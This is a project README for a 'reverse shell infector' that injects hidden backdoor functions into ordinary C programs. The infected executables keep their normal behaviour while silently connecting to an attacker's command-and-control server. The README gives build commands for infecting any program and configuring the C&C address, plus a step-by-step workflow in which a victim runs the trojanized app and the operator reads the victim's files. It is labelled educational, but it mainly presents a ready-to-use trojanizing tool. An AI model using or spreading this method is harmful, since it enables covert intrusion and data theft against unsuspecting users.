# Reverse Shell Program Infector

**A program infection tool that embeds reverse shell backdoors into C programs for covert remote access**

*Educational cybersecurity project demonstrating code injection, socket programming, and remote command execution techniques*

---

## ⚠️ Disclaimer

This project is intended solely for educational purposes to understand malware infection techniques, reverse shell mechanics, and network security concepts. Use only in controlled environments with explicit permission on programs and systems you own. Unauthorized modification of software or remote access to computer systems is illegal.

---

## Overview

This project is a **reverse shell infector** that transforms legitimate C programs into remotely controllable backdoors. Unlike standalone reverse shell programs, this tool takes clean C source code as input and produces infected executables that maintain their original functionality while silently establishing remote access channels.

https://github.com/user-attachments/assets/f9f2d6cc-15eb-4d9c-8250-01dc937dde89

### What This Tool Does

This is **not** a direct reverse shell program. Instead, it's an **infection framework** that:

1. **Takes any C program as compilation input** (`your_program.c`)
2. **Injects reverse shell backdoor code** during the build process
3. **Produces infected executables** that:
   - Execute the original program normally (maintains cover)
   - Silently connect to your control server in the background
   - Provide full remote shell access to the infected system

The infected program appears and behaves like the original to any user, while secretly establishing a covert communication channel with your server.

### Key Features

- **C Program Infector** - Embeds backdoors into existing source code
- **Silent reverse connections** - Target initiates outbound connection to controller
- **Dual-behavior executables** - Original functionality + hidden backdoor
- **Real-time remote shell access** with output streaming
- **TCP/IP socket-based covert channel**
- **Cross-platform infection** (Linux native, Windows via Wine)
- **Configurable Command & Control (C&C)** server settings
- **Library-based injection** for seamless integration

### Supported Platforms

- **Linux**: Native support (client and server)
- **Windows**: Experimental support via Wine

---

## Architecture

### Infection Process
```
┌─────────────────────────────────────────────────────────────┐
│                    PROGRAM INFECTION FLOW                    │
└─────────────────────────────────────────────────────────────┘

Input: Clean C Program (calculator.c)
         ↓
    [Infector Framework]
    - Link backdoor library
    - Embed berkeley_backdoor() or winsock_backdoor()
    - Configure C&C server IP:PORT
         ↓
Output: Infected Executable (infected_calculator)
         ├─ Original calculator functionality (visible)
         └─ Reverse shell backdoor (hidden)
```

### Silent Connection Establishment

Once the infected program executes on the target system:
```
Target Machine                          Your Control Server
     |                                          |
     | [User runs infected_program]            |
     |                                          |
     |--- Silent Outbound Connection --------->| [Listening]
     |    (Bypasses firewall)                  |
     |                                          |
     |                 Connection Established  |
     |<======== Covert Channel Active ========>|
     |                                          |
     |<------------ Commands ------------------|
     | Execute in background shell             |
     |------------- Output ------------------->|
     |                                          |
   [Program continues normally]      [Full remote control]
```

**Key advantage:** The connection flows FROM target TO server (reverse), bypassing most firewall rules that block inbound connections.

---

## The Infection Framework

### Core Components

**1. Backdoor Injection Functions:**
```c
// Linux reverse shell payload
berkeley_backdoor();

// Windows reverse shell payload  
winsock_backdoor();
```

These functions are **compiled into your target program**, transforming it into a Trojanized executable.

**2. Socket Connection Layer**

Establishes silent TCP/IP communication between infected client and your control server using Berkeley sockets (Linux) or Winsock (Windows).

**3. Remote Command Execution Layer**

**Infected Client (Target Machine):**
- Initiates outbound connection to your C&C server
- Spawns hidden shell process (`/bin/bash` on Linux)
- Redirects stdin, stdout, stderr to socket using `dup2()`
- Routes all shell I/O through network connection
- Maintains original program execution (dual behavior)

**Control Server (Your Machine):**
- Accepts incoming reverse connection from infected program
- Forwards commands to remote shell via socket
- Receives and displays command output in real-time

---

## Building Infected Programs

### Default Infection

Infects the example test program with localhost backdoor (`127.0.0.1:4242`):
```bash
make
```

**Generates in `bin/`:**
- `linux_server` - Your control server for Linux-infected programs
- `linux_infected_program_test` - Infected Linux executable
- `windows_server.exe` - Control server for Windows-infected programs (Wine)
- `windows_infected_program_test.exe` - Infected Windows executable (Wine)

### Infecting Your Own Programs

**Infect a custom C program:**
```bash
make INFECT_PROGRAM=path/to/your_program.c
```

**Configure your C&C server location:**
```bash
make SERVER_IP=192.168.1.100 SERVER_PORT=8080
```

**Link additional dependencies:**
```bash
make INFECT_PROGRAM=program.c EXTRA_OBJS="utils.o helpers.o"
```

---

## Usage

### Complete Attack Simulation Workflow

**Step 1: Prepare your control server**
```bash
# On your controller machine
./bin/linux_server
# Server now listening for reverse connections...
```

**Step 2: Target executes infected program**
```bash
# When victim runs the program on their machine
./infected_victim_app
# Program appears to work normally
# Silent reverse connection established in background
```

**Step 3: Remote control established**
```bash
# On your control server - you now have shell access:
pwd                      # Current directory on target
whoami                   # Target's username  
ls -la                   # List target's files
cat sensitive_data.txt   # Read files remotely
# Full remote command execution!
```

---

## Learning Objectives

- **Program infection techniques** and code injection
- **Reverse shell mechanics** and covert channels
- **Socket programming** for C&C communication
- **File descriptor manipulation** and I/O redirection
- **Process management** and concurrent execution
- **Malware dual-behavior** patterns (legitimate + malicious)
- **Network-based backdoor** implementation

## Resources

- [Socket Programming in C](https://www.geeksforgeeks.org/c/socket-programming-cc/) - Network programming fundamentals
- [Basics of Reverse Shell](https://medium.com/@eaddrinuse-98/basics-of-reverse-shell-290eac5ab9a5) - Reverse shell implementation concepts
